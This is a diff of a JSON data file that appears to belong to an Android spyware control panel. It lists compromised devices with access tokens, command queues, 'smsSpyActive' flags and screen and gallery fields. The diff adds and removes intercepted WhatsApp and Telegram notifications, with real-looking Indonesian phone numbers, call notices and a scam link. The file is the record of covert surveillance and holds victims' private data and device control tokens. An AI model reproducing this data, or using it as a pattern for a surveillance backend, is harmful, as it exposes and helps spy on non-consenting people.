@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777350564920,
+    "lastSeen": 1777350566335,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -458,7 +458,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777350563634,
+    "lastSeen": 1777350566646,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -474,6 +474,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Sending video to +62 852-3694-0729",
+        "time": "28/04 11:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350567860
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Sending video to +62 852-3694-0729",
+        "time": "28/04 11:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350567556
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Sending video to +62 852-3694-0729",
+        "time": "28/04 11:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350567311
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Sending video to +62 852-3694-0729",
+        "time": "28/04 11:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350566922
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Sending video to +62 852-3694-0729",
+        "time": "28/04 11:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350566638
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Sending video to +62 852-3694-0729",
+        "time": "28/04 11:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350566327
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4425,54 +4473,6 @@
         "time": "27/04 19:31",
         "pkg": "com.whatsapp",
         "receivedAt": 1777293091933
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎25 pesan dari 3 chat",
-        "time": "27/04 19:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777293088084
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "GB ALL GAME V¹ | REGZ STORE: ~ BURRSHOP",
-        "content": "📷 11 1-5k chat",
-        "time": "27/04 19:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777293087957
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 831-7933-3065",
-        "content": "‎3 panggilan video tak terjawab",
-        "time": "27/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777291780374
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 831-7933-3065",
-        "content": "📹 Telepon video masuk",
-        "time": "27/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777291764749
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 831-7933-3065",
-        "content": "📹 Telepon video masuk",
-        "time": "27/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777291764669
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 831-7933-3065",
-        "content": "📹 Telepon video masuk",
-        "time": "27/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777291763119
       }
     ],
     "galleryPhotos": [],
@@ -4507,6 +4507,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "BLAST WA FREE😋🤑: AABMMWEX",
+        "content": "YANG MAU NONTON IKLAN AJA DIBAYAR DISINI https://t.me/Pay_Plus_Bot/app?startapp=5900417149              BUKAN BLAST WA!!",
+        "time": "28/04 11:29",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777350566858
+      },
       {
         "appName": "Telegram",
         "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
